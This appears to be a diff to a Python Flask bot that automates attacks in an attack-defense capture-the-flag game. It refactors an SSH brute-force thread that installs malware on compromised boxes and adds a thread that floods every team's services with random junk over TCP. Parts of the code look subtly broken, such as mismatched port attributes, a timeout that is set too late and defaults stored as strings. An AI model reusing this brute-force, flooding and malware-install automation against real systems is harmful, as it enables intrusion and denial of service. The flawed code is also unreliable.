@@ -1,6 +1,7 @@
 import os
 import random
 import re
+import socket
 import string
 import time
 from base64 import b64decode
@@ -28,6 +29,8 @@ DEFAULT_SSH_BRUTEFORCE_INTERVAL = "30"
 DEFAULT_SSH_BRUTEFORCE_TIMEOUT = "5"
 DEFAULT_SPAM_INTERVAL_MIN = "5"
 DEFAULT_SPAM_INTERVAL_MAX = "20"
+DEFAULT_SPAM_TIMEOUT = "5"
+DEFAULT_SPAM_RAND_FILE = "rand_file.txt"
 
 # Create Flask and database
 app = Flask(__name__, template_folder=TEMPLATE_DIR)
@@ -54,6 +57,8 @@ def main():
                 "Seconds to wait for timeout during SSH bruteforce")
     add_setting("spam_interval_min", DEFAULT_SPAM_INTERVAL_MIN, "Minimum seconds to wait between each spam")
     add_setting("spam_interval_max", DEFAULT_SPAM_INTERVAL_MAX, "Maximum seconds to wait between each spam")
+    add_setting("spam_timeout", DEFAULT_SPAM_TIMEOUT, "Seconds to wait for timeout during spamming")
+    add_setting("spam_rand_file", DEFAULT_SPAM_RAND_FILE, "Path to file with random strings line by line")
 
     # Start threads
     ssh_bruteforce_thread = Thread(target=ssh_bruteforce)
@@ -606,26 +611,26 @@ def update():
 # <editor-fold desc="Thread Functions">
 
 def ssh_bruteforce():
-    # Setup SSH client
-    client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
-
-    # Get settings from database
-    subnet = Setting.query.get("subnet").value
-    malware_install = Setting.query.get("malware_install").value
-    try:
-        interval = int(Setting.query.get("ssh_bruteforce_interval").value)
-    except:
-        log("ssh_bruteforce", "Invalid ssh_bruteforce_interval setting")
-        interval = DEFAULT_SSH_BRUTEFORCE_INTERVAL
-    try:
-        timeout = int(Setting.query.get("ssh_bruteforce_timeout").value)
-    except:
-        log("ssh_bruteforce", "Invalid ssh_bruteforce_timeout setting")
-        timeout = DEFAULT_SSH_BRUTEFORCE_TIMEOUT
-
     # Continue trying
     while True:
+
+        # Setup SSH client
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
+
+        # Get settings from database
+        subnet = Setting.query.get("subnet").value
+        malware_install = Setting.query.get("malware_install").value
+        try:
+            interval = int(Setting.query.get("ssh_bruteforce_interval").value)
+        except:
+            log("ssh_bruteforce", "Invalid ssh_bruteforce_interval setting")
+            interval = DEFAULT_SSH_BRUTEFORCE_INTERVAL
+        try:
+            timeout = int(Setting.query.get("ssh_bruteforce_timeout").value)
+        except:
+            log("ssh_bruteforce", "Invalid ssh_bruteforce_timeout setting")
+            timeout = DEFAULT_SSH_BRUTEFORCE_TIMEOUT
 
         # Get boxes that are not pwned
         boxes = Box.query.filter_by(pwned=False).all()
@@ -634,7 +639,7 @@ def ssh_bruteforce():
         for box in boxes:
 
             # Get box IP
-            ip = subnet.replace("T", box.team_num).replace("B", box.service_ip)
+            ip = get_ip(subnet, box)
 
             # Get SSH usernames and passwords
             usernames = SSHUsername.query.all()
@@ -670,7 +675,71 @@ def ssh_bruteforce():
 
 
 def spam():
-    return
+    # Continue spamming
+    while True:
+
+        # Get settings from database
+        subnet = Setting.query.get("subnet").value
+        try:
+            interval_min = int(Setting.query.get("spam_interval_min").value)
+        except:
+            log("spam", "Invalid spam_interval_min setting")
+            interval_min = DEFAULT_SPAM_INTERVAL_MIN
+        try:
+            interval_max = int(Setting.query.get("spam_interval_max").value)
+        except:
+            log("spam", "Invalid spam_interval_max setting")
+            interval_max = DEFAULT_SPAM_INTERVAL_MAX
+        try:
+            timeout = int(Setting.query.get("spam_timeout").value)
+        except:
+            log("spam", "Invalid spam_timeout setting")
+            timeout = DEFAULT_SPAM_TIMEOUT
+
+        # Load random strings
+        with open(Setting.query.get("spam_rand_file").value, "r") as f:
+            data = f.read()
+        strings = []
+        for d in data.splitlines():
+            strings.append(d.strip())
+
+        # Get all boxes
+        boxes = Box.query.all()
+
+        # Iterate over boxes
+        for box in boxes:
+
+            # Get box IP
+            ip = get_ip(subnet, box)
+            log("spam", f"spamming {ip}:{box.port}")
+
+            # Generate data
+            data = []
+            for _ in range(random.randint(2, 4)):
+                choice = random.randint(0, 2)
+                if choice == 0:
+                    data.append(random_string(strings))
+                elif choice == 1:
+                    data.append(random_characters())
+                elif choice == 2:
+                    data.append(random_binary())
+
+            # Send the data
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                socket.setdefaulttimeout(timeout)
+                s.connect((ip, box.service.port))
+                for d in data:
+                    s.send(d)
+                s.close()
+            except:
+                log("spam", f"failure on {ip}:{box.port}")
+                continue
+
+            # Wait until next spam
+            interval = random.randint(interval_min, interval_max)
+            log("spam", f"sleeping for {interval} seconds")
+            time.sleep(interval)
 
 
 # </editor-fold>
@@ -704,12 +773,16 @@ def extract_flags(data, team_num, service_ip, source):
     # Submit the flags
     for flag in new_flags:
         # TODO: submit the flag and check for success
-        success = True
+        success = False
         if success:
             flag.submitted = datetime.now()
             db.session.commit()
             log("extract_flags",
                 f"flag {flag} successfully submitted from team {team_num} and service {service_ip} from {source}")
+
+
+def get_ip(subnet, box):
+    return subnet.replace("T", box.team_num).replace("B", box.service_ip)
 
 
 def ssh_cmd(client, command):
